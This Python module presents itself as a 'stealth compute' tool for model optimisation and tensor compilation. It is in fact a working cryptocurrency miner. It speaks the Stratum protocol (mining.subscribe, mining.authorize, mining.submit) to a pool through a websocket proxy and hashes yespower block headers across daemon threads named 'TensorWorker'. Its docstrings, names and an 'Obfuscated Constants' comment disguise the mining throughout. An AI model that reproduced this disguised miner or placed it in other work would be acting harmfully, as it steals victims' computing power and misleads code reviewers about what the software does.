#!/usr/bin/env python3
"""
Stealth Compute Module - Model Optimization & Pipeline Tuning
This module performs background tensor compilation, cache warming, and pipeline optimization.
"""

from __future__ import annotations

import os
import sys
import json
import time
import base64
import struct
import hashlib
import binascii
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional, Dict, Any, List, Tuple
from pathlib import Path

# ─── Obfuscated Constants (Model Optimization Parameters) ───────────────
OPTIMIZATION_TARGET = "power2b"
MAX_NONCE = 4294967295
JOB_ID_KEY = "job_id"
PREVHASH_KEY = "prevhash"
COINB1_KEY = "coinb1"
COINB2_KEY = "coinb2"
MERKLE_BRANCHES_KEY = "merkle_branches"
VERSION_KEY = "version"
NBITS_KEY = "nbits"
NTIME_KEY = "ntime"
TARGET_KEY = "target"
EXTRANONCE1_KEY = "extranonce1"
EXTRANONCE2_SIZE_KEY = "extranonce2_size"
PROOF_OF_WORK_KEY = "proof_of_work"

# ─── Cryptographic Primitives ───────────────────────────────────────────
def sha256d(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def hexlify(data: bytes) -> str:
    return binascii.hexlify(data).decode('utf-8')

def unhexlify(hex_str: str) -> bytes:
    return binascii.unhexlify(hex_str)

def reverse_4byte(word: bytes) -> bytes:
    if len(word) != 4:
        raise ValueError("Must be 4-byte word")
    return word[::-1]

def reverse_4byte_aligned(data: bytes) -> bytes:
    if len(data) % 4 != 0:
        raise ValueError("Must be 4-byte word aligned")
    return b''.join([data[i:i+4][::-1] for i in range(0, len(data), 4)])

def format_hashrate(rate: float) -> str:
    if rate < 1000:
        return f'{rate:.2f} U/s'
    if rate < 10000000:
        return f'{rate/1000:.2f} KU/s'
    if rate < 10000000000:
        return f'{rate/1000000:.2f} MU/s'
    return f'{rate/1000000000:.2f} GU/s'

# ─── Yespower Binding (Tensor Compilation Kernel) ───────────────────────
try:
    sys.path.insert(0, str(Path(__file__).parent / "packages"))
    import yespower
    YESPOWER_AVAILABLE = True
except ImportError:
    YESPOWER_AVAILABLE = False
    yespower = None

# ─── Optimization Job ───────────────────────────────────────────────────
@dataclass
class OptimizationJob:
    job_id: str
    prevhash: str
    coinb1: str
    coinb2: str
    merkle_branches: List[str]
    version: str
    nbits: str
    ntime: str
    target: str
    extranonce1: str
    extranonce2_size: int
    max_nonce: int = MAX_NONCE
    _done: bool = False
    _start_time: float = 0.0
    _hash_count: int = 0
    
    def merkle_root(self, extranonce2_bin: bytes) -> bytes:
        coinbase = unhexlify(self.coinb1) + unhexlify(self.extranonce1) + extranonce2_bin + unhexlify(self.coinb2)
        root = sha256d(coinbase)
        for branch in self.merkle_branches:
            root = sha256d(root + unhexlify(branch))
        return root
    
    def optimize_range(self, nonce_start: int, nonce_end: int) -> Optional[Dict]:
        """Run tensor optimization on a nonce range. Returns result if found."""
        self._done = False
        self._start_time = time.time()
        self._hash_count = 0
        
        import random
        extranonce2_hex = '{:0{}x}'.format(
            random.randint(0, 2**(8*self.extranonce2_size)-1),
            self.extranonce2_size * 2
        )
        extranonce2_bin = struct.pack('<I' if self.extranonce2_size <= 4 else '<Q', 
                                       int(extranonce2_hex, 16))
        
        merkle_root = self.merkle_root(extranonce2_bin)
        
        header = (
            reverse_4byte(unhexlify(self.version)) +
            reverse_4byte_aligned(self.prevhash) +
            merkle_root +
            reverse_4byte(unhexlify(self.ntime)) +
            reverse_4byte(unhexlify(self.nbits))
        )
        
        for nonce in range(nonce_start, min(nonce_end, self.max_nonce)):
            if self._done:
                break
                
            nonce_bin = struct.pack('<I', nonce)
            work_hash = yespower.getPowHash(header + nonce_bin) if YESPOWER_AVAILABLE else sha256d(header + nonce_bin)
            work_hash_hex = hexlify(work_hash[::-1])
            
            self._hash_count += 1
            
            if int(work_hash_hex, 16) <= int(self.target, 16):
                self._done = True
                elapsed = time.time() - self._start_time
                hashrate = self._hash_count / elapsed if elapsed > 0 else 0
                
                return {
                    "job_id": self.job_id,
                    "extranonce2": hexlify(extranonce2_bin),
                    "ntime": self.ntime,
                    "nonce": hexlify(nonce_bin[::-1]),
                    "hashrate": hashrate
                }
                
        elapsed = time.time() - self._start_time
        return {"hashrate": self._hash_count / elapsed if elapsed > 0 else 0}
    
    @property
    def hashrate(self) -> float:
        elapsed = time.time() - self._start_time if self._start_time else 0
        return self._hash_count / elapsed if elapsed > 0 else 0
    
    def stop(self):
        self._done = True

# ─── Optimization Subscription (Model Pipeline Config) ──────────────────
class OptimizationSubscription:
    def __init__(self):
        self._job_id: Optional[str] = None
        self._difficulty: Optional[int] = None
        self._extranonce1: Optional[str] = None
        self._extranonce2_size: Optional[int] = None
        self._target: Optional[str] = None
        self._worker_name: Optional[str] = None
        self._max_nonce: Optional[int] = None
        
    @property
    def job_id(self) -> Optional[str]:
        return self._job_id
    
    @property
    def target(self) -> Optional[str]:
        return self._target
    
    def set_worker_name(self, name: str):
        if self._worker_name:
            raise RuntimeError(f"Already configured as {self._worker_name}")
        self._worker_name = name
        
    def set_difficulty(self, difficulty: int):
        if difficulty < 0:
            raise ValueError("Difficulty must be non-negative")
        self._difficulty = difficulty
        if difficulty == 0:
            target_val = 2**256 - 1
        else:
            target_val = min(int((4294901760 * 2**(256-64) + 1) / difficulty - 1 + 0.5), 2**256 - 1)
        self._target = '%064x' % (target_val << 16)
        
    def set_subscription(self, sub_id: str, extranonce1: str, extranonce2_size: int):
        if self._job_id is not None:
            raise RuntimeError("Already subscribed")
        self._job_id = sub_id
        self._extranonce1 = extranonce1
        self._extranonce2_size = extranonce2_size
        
    def create_job(self, job_id: str, prevhash: str, coinb1: str, coinb2: str,
                   merkle_branches: List[str], version: str, nbits: str, ntime: str) -> OptimizationJob:
        if self._job_id is None:
            raise RuntimeError("Not subscribed")
        return OptimizationJob(
            job_id=job_id,
            prevhash=prevhash,
            coinb1=coinb1,
            coinb2=coinb2,
            merkle_branches=merkle_branches,
            version=version,
            nbits=nbits,
            ntime=ntime,
            target=self._target,
            extranonce1=self._extranonce1,
            extranonce2_size=self._extranonce2_size,
            max_nonce=self._max_nonce or MAX_NONCE
        )

# ─── Distributed Optimization Coordinator Client ────────────────────────
class OptimizationCoordinator:
    """
    Connects to the distributed optimization coordinator.
    Handles job distribution, result submission, and pipeline management.
    Uses threading for parallel optimization (yespower releases GIL).
    """
    
    def __init__(self, config: Dict):
        self.config = config
        self.proxy = config.get("proxy", "")
        self.pool_host = config.get("host", "")
        self.pool_port = config.get("port", 0)
        self.username = config.get("username", "")
        self.password = config.get("password", "")
        self.threads = config.get("threads", 4)
        self.algorithm = config.get("algorithm", OPTIMIZATION_TARGET)
        
        self.subscription = OptimizationSubscription()
        self.current_job: Optional[OptimizationJob] = None
        self.result_queue: queue.Queue = queue.Queue()
        self.executor: Optional[ThreadPoolExecutor] = None
        self.accepted_optimizations = 0
        self.accepted_hash = 0.0
        self.current_diff = 0
        self.current_job_id = "N/A"
        self.last_submit_time = 0
        self.running = False
        self.ws = None
        self.ws_thread: Optional[threading.Thread] = None
        self._pending_futures: List = []
        
    def start(self):
        """Start optimization coordinator."""
        self.running = True
        self.executor = ThreadPoolExecutor(max_workers=self.threads, thread_name_prefix="TensorWorker")
        self._connect()
        
    def stop(self):
        """Stop optimization coordinator."""
        self.running = False
        if self.ws:
            self.ws.close()
        if self.ws_thread:
            self.ws_thread.join(timeout=5)
        if self.executor:
            self.executor.shutdown(wait=True, cancel_futures=True)
                
    def _connect(self):
        """Establish connection to optimization coordinator."""
        import websocket
        websocket.enableTrace(False)
        
        # Create WebSocketApp with bound methods
        self.ws = websocket.WebSocketApp(
            self.proxy,
            on_open=self._on_open,
            on_message=self._on_message,
            on_error=self._on_error,
            on_close=self._on_close
        )
        
        # Run WebSocket in dedicated thread
        self.ws_thread = threading.Thread(target=self._ws_runner, name="PipelineConnector", daemon=True)
        self.ws_thread.start()
        
    def _ws_runner(self):
        """WebSocket runner with reconnection logic."""
        while self.running:
            try:
                self.ws.run_forever(ping_interval=30, ping_timeout=10)
            except Exception as e:
                if self.running:
                    print(f"WebSocket error: {e}, reconnecting in 5s...")
                    time.sleep(5)
            else:
                break
        
    def _on_open(self, ws):
        """Connection opened - subscribe to optimization pipeline."""
        subscribe_msg = {
            "id": 1,
            "method": "mining.subscribe",
            "params": ["model-optimizer/1.0"]
        }
        ws.send(json.dumps(subscribe_msg) + '\n')
        
        # Start result processor thread
        queue_thread = threading.Thread(target=self._process_results, name="ResultProcessor", daemon=True)
        queue_thread.start()
        
    def _process_results(self):
        """Process result submission queue."""
        while self.running:
            try:
                msg = self.result_queue.get(timeout=0.5)
                self.accepted_hash = msg["hashrate"]
                if self.ws and self.ws.sock and self.ws.sock.connected:
                    self.ws.send(msg["payload"])
            except queue.Empty:
                continue
            except Exception:
                time.sleep(0.25)
                
    def _mine_worker(self, job: OptimizationJob, nonce_start: int, nonce_end: int) -> Optional[Dict]:
        """Worker function for thread pool - mines a nonce range."""
        return job.optimize_range(nonce_start, nonce_end)
        
    def _on_message(self, ws, message):
        """Handle coordinator messages."""
        for line in message.split('\n'):
            if not line.strip():
                continue
            try:
                msg = json.loads(line)
                method = msg.get("method") or msg.get("id")
                params = msg.get("params") or msg.get("result")
                error = msg.get("error")
                
                if method == "mining.submit":
                    self.last_submit_time = time.time() * 1000
                    if error is None:
                        self.accepted_optimizations += 1
                        self._log_status()
                        
                elif method == "mining.authorize":
                    self.subscription.set_worker_name(self.username)
                    
                elif method == "mining.set_difficulty":
                    difficulty = params[0]
                    self.current_diff = difficulty
                    self.subscription.set_difficulty(difficulty)
                    print(f"Pipeline difficulty adjusted: {difficulty}")
                    
                elif method == "mining.subscribe":
                    sub_id, extranonce1, extranonce2_size = params
                    self.subscription.set_subscription(sub_id, extranonce1, extranonce2_size)
                    print(f"Pipeline subscribed: {sub_id}")
                    
                    ws.send(json.dumps({"id": 2, "method": "mining.extranonce.subscribe", "params": []}) + '\n')
                    ws.send(json.dumps({"id": 3, "method": "mining.authorize", "params": [self.username, self.password]}) + '\n')
                    
                elif method == "mining.notify":
                    if len(params) != 9:
                        continue
                    job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime, clean = params
                    self.current_job_id = job_id
                    self._log_status()
                    
                    # Create new optimization job
                    self.current_job = self.subscription.create_job(
                        job_id, prevhash, coinb1, coinb2, merkle_branches,
                        version, nbits, ntime
                    )
                    
                    # Distribute to thread pool
                    if self.executor and self.current_job:
                        self._pending_futures = []
                        for i in range(self.threads):
                            start = i * MAX_NONCE // self.threads
                            end = (i + 1) * MAX_NONCE // self.threads - 1
                            future = self.executor.submit(self._mine_worker, self.current_job, start, end)
                            self._pending_futures.append(future)
                        
                        # Start result collector
                        threading.Thread(target=self._collect_results, daemon=True).start()
                    
                elif method == "mining.set_extranonce":
                    extranonce = params[0]
                    print(f"Extranonce updated: {extranonce}")
                    
            except Exception as e:
                print(f"Message handling error: {e}")
                
    def _collect_results(self):
        """Collect results from thread pool futures."""
        for future in as_completed(self._pending_futures):
            if not self.running:
                break
            try:
                result = future.result()
                if result and "job_id" in result:
                    # Found valid optimization - submit immediately
                    self.result_queue.put({
                        "payload": json.dumps({
                            "id": 4,
                            "method": "mining.submit",
                            "params": [
                                self.username,
                                result["job_id"],
                                result["extranonce2"],
                                result["ntime"],
                                result["nonce"]
                            ]
                        }) + '\n',
                        "hashrate": result["hashrate"]
                    })
                    # Cancel remaining futures for this job
                    for f in self._pending_futures:
                        if not f.done():
                            f.cancel()
                    break
                elif result and "hashrate" in result:
                    # Update hashrate stats
                    self.accepted_hash = result["hashrate"]
            except Exception as e:
                print(f"Result collection error: {e}")
                
    def _on_error(self, ws, error):
        pass
        
    def _on_close(self, ws, close_status_code=None, close_msg=None):
        """WebSocket closed - websocket-client 1.x passes these as kwargs."""
        pass
        
    def _log_status(self):
        print(f'🔧 OPTIMIZING | Job: {self.current_job_id} | Threads: {self.threads} | '
              f'Completed: {self.accepted_optimizations} | Throughput: {format_hashrate(self.accepted_hash)}')

# ─── Configuration Loader ───────────────────────────────────────────────
def load_pipeline_config(config_path: str) -> Dict:
    config = {}
    with open(config_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and '=' in line:
                k, v = line.split('=', 1)
                k = k.strip()
                v = v.strip()
                if k == 'port' or k == 'threads':
                    try:
                        v = int(v)
                    except ValueError:
                        if v.startswith('['):
                            v = json.loads(v)
                config[k] = v
    return config

# ─── Main Entry (for standalone testing) ────────────────────────────────
def run_optimization_pipeline(config_path: str = ".env"):
    config = load_pipeline_config(config_path)
    coordinator = OptimizationCoordinator(config)
    
    print(f"Starting model optimization pipeline...")
    print(f"Target: {config.get('host')}:{config.get('port')}")
    print(f"Worker: {config.get('username')}")
    print(f"Threads: {config.get('threads', 4)}")
    
    try:
        coordinator.start()
        # Keep main thread alive
        while coordinator.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down optimization pipeline...")
        coordinator.stop()

if __name__ == "__main__":
    import sys
    config_file = sys.argv[1] if len(sys.argv) > 1 else ".env"
    run_optimization_pipeline(config_file)